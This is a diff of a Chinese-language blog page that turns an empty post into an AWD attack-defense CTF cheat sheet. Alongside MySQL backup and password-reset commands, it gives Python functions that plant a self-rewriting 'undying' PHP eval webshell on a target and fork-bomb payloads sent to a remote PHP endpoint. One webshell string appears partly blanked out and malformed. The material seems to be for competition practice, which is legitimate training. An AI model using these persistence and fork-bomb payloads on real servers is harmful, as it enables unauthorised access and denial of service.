@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="D3vil">
   <meta name="keywords" content="CTF 期货">
-  <title>ai_learn - D3vil&#39;s Blog</title>
+  <title>awd - D3vil&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -164,8 +164,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-11-02 18:48">
-      2020年11月2日 晚上
+    <time datetime="2020-11-19 08:47">
+      2020年11月19日 早上
     </time>
   </div>
 
@@ -175,7 +175,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      4 字
+      488 字
     </span>
   
 
@@ -185,7 +185,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      8
        分钟
     </span>
   
@@ -216,7 +216,88 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1>
+              <h1 id="0x00-refer"><a href="#0x00-refer" class="headerlink" title="0x00 refer"></a>0x00 refer</h1><p><a href="https://www.jagger2zr.com/2019/08/30/AWD%E8%B5%B7%E6%89%8B%E5%BC%8F%E5%8F%8A%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://www.jagger2zr.com/2019/08/30/AWD%E8%B5%B7%E6%89%8B%E5%BC%8F%E5%8F%8A%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p>
+<h1 id="0x0起手"><a href="#0x0起手" class="headerlink" title="0x0起手"></a>0x0起手</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>压缩命令：<code>tar -zcvf www.tar.gz .</code></p>
+<p>解压命令：tar -xvxf <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> -C .</p>
+<p>也可直接xshell转，一般很快</p>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>cd /var/lib/mysql</p>
+<p>mysqldump -u root -p Test&gt;Test0809.sql</p>
+<p>mysql -u root -p Test&lt;Test0809.sql，输入密码即可（将要恢复的数据库文件放到服务器的某个目录下，并进入这个目录执行以上命令|）</p>
+<pre><code class="hljs jboss-cli">mysqldump -uroot -p <span class="hljs-params">--single-transaction</span> <span class="hljs-params">--all-databases</span> &gt; backup.sql <span class="hljs-comment">#所有</span>
+mysqldump -u root -p <span class="hljs-params">--single-transaction</span> dataname &gt; dataname.sql <span class="hljs-comment">#单个</span>
+
+<span class="hljs-comment">#遇到加锁的情况：</span>
+mysqldump <span class="hljs-params">--skip-lock-tables</span> -uxxxx -p -h 166.111.9.173 -R urlevent20180319 &gt; <span class="hljs-string">./backup.sql</span>
+
+`mysqldump -h127.0.0.1 -uroot -ppassword database |gzip &gt; $backupDir/$database-$today.sql.gz`</code></pre>
+
+<p>授权</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> root@localhost <span class="hljs-keyword">IDENTIFIED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">"ysx123456"</span>;
+<span class="hljs-keyword">flush</span> <span class="hljs-keyword">privileges</span>;</code></pre>
+
+
+
+
+
+<h3 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h3><pre><code class="hljs sql"><span class="hljs-keyword">update</span> mysql.user <span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span>=<span class="hljs-keyword">PASSWORD</span>(<span class="hljs-string">'123456'</span>) <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">'root'</span>;
+<span class="hljs-keyword">flush</span> <span class="hljs-keyword">privileges</span>;</code></pre>
+
+
+
+<h2 id="0x02-权限控制"><a href="#0x02-权限控制" class="headerlink" title="0x02 权限控制"></a>0x02 权限控制</h2><h4 id="写不死马"><a href="#写不死马" class="headerlink" title="写不死马"></a>写不死马</h4><ul>
+<li><p>eval型</p>
+<pre><code class="hljs perl">def write_memery_webshell(url, directory, password): 
+    sleep_time = <span class="hljs-number">500</span> <span class="hljs-comment"># micro second </span>
+    code = <span class="hljs-string">"&lt;?php $content = '&lt;?php eval(base64_decode($_REQUEST[%s]));?&gt;'; $writable_path = '%s'; $filename = '.%s.php'; $path = $writable_path.'/'.$filename; ignore_user_abort(true); set_time_limit(0);      while(true)&#123; if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;"</span> % (password, directory, password, sleep_time)
+    filename = <span class="hljs-string">".%s.php"</span> % (password)
+    path = <span class="hljs-string">"%s/%s"</span> % (directory, filename)
+    payload = <span class="hljs-string">"file_put_contents('%s', base64_decode('%s'));"</span> % (path, code.encode(<span class="hljs-string">"base64"</span>).replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>)) 
+    <span class="hljs-keyword">print</span> payload 
+    <span class="hljs-keyword">return</span> code_exec(url, payload).<span class="hljs-keyword">split</span>(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>]</code></pre>
+</li>
+<li><p>命令型</p>
+</li>
+</ul>
+<pre><code class="hljs perl">def write_memery_webshell(url, directory, password): 
+    sleep_time = <span class="hljs-number">500</span> <span class="hljs-comment"># micro second </span>
+    code = <span class="hljs-string">"&lt;?php                                       ?&gt;'; $writable_path = '%s'; $filename = '.%s.php'; $path = $writable_path.'/'.$filename; ignore_user_abort(true); set_time_limit(0); while(true)&#123;      if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;"</span> % (password, directory, password, sleep_time) 
+    filename = <span class="hljs-string">".%s.php"</span> % (password) 
+    path = <span class="hljs-string">"%s/%s"</span> % (directory, filename) 
+    payload = <span class="hljs-string">"file_put_contents('%s', base64_decode('%s'));"</span> % (path, code.encode(<span class="hljs-string">"base64"</span>).replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>)) 
+    <span class="hljs-keyword">return</span> shell_exec(url, payload).<span class="hljs-keyword">split</span>(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>]</code></pre>
+
+<ul>
+<li>唤醒内存马</li>
+</ul>
+<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">active_memery_webshell</span><span class="hljs-params">(url)</span>:</span> 
+    <span class="hljs-keyword">try</span>: 
+        requests.get(url, timeout=<span class="hljs-number">0.5</span>) 
+    <span class="hljs-keyword">except</span>: 
+        <span class="hljs-keyword">print</span> <span class="hljs-string">"[+] OK!"</span></code></pre>
+
+
+
+<h4 id="fork炸弹"><a href="#fork炸弹" class="headerlink" title="fork炸弹"></a>fork炸弹</h4><ul>
+<li><p>eval型</p>
+<pre><code class="hljs routeros">def eval_fork(ip): 
+    host = ip
+   <span class="hljs-built_in"> port </span>= <span class="hljs-string">"80"</span> 
+    url = <span class="hljs-string">"http://%s:%s/code.php"</span> % (host, port) 
+    code = <span class="hljs-string">"system(\"echo '.() &#123; .|.&amp; &#125; &amp;&amp; .' &gt; /tmp/aaa\");system(\"/bin/bash /tmp/aaa\");echo \"seems good!\";"</span> 
+    data = &#123;<span class="hljs-string">'pass'</span>:code&#125;
+    requests.post(url, <span class="hljs-attribute">data</span>=data)</code></pre>
+</li>
+<li><p>命令型</p>
+<pre><code class="hljs routeros">def shell_fork(ip): 
+    host = ip
+   <span class="hljs-built_in"> port </span>= <span class="hljs-string">"80"</span> 
+    url = <span class="hljs-string">"http://%s:%s/c.php"</span> % (host, port) 
+    command = <span class="hljs-string">":()&#123; :|: &amp; &#125;;:"</span> 
+    shell_exec(url, command)</code></pre>
+
+</li>
+</ul>
+<h2 id="0x03-流量"><a href="#0x03-流量" class="headerlink" title="0x03 流量"></a>0x03 流量</h2><h3 id="脏流量"><a href="#脏流量" class="headerlink" title="脏流量"></a>脏流量</h3>
             </article>
             <hr>
             <div>
@@ -226,7 +307,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</a>
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
                     
                   </div>
                 
@@ -239,18 +320,12 @@
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2020/11/14/%E5%BC%B9shell%E7%9A%84%E6%96%B9%E5%BC%8F/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">弹shell的方式</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/09/01/larvel/">
-                        <span class="hidden-mobile">larvel</span>
+                      <a href="/2020/11/16/%E5%9F%BA%E6%9C%AC%E5%8A%9F/">
+                        <span class="hidden-mobile">基本功</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -389,7 +464,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "ai_learn&nbsp;",
+        "awd&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
